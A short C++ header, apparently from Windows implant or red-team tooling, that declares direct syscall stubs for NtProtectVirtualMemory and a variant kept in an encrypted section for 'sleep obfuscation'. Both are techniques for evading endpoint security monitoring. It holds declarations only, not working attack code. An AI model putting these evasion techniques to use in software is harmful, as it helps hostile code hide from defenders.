#pragma once
#include <windows.h>

namespace syscall_utils {
    DWORD get_id(BYTE* fn);
    void  init(HMODULE ntdll);
}

//actual stubs in syscall_stub.S
extern "C" NTSTATUS nt_protect(HANDLE proc, PVOID* base, PSIZE_T size, ULONG new_prot, PULONG old_prot);
//nt_protect_crypt lives in .crypt section for use during sleep obfuscation
extern "C" NTSTATUS nt_protect_crypt(HANDLE proc, PVOID* base, PSIZE_T size, ULONG new_prot, PULONG old_prot);
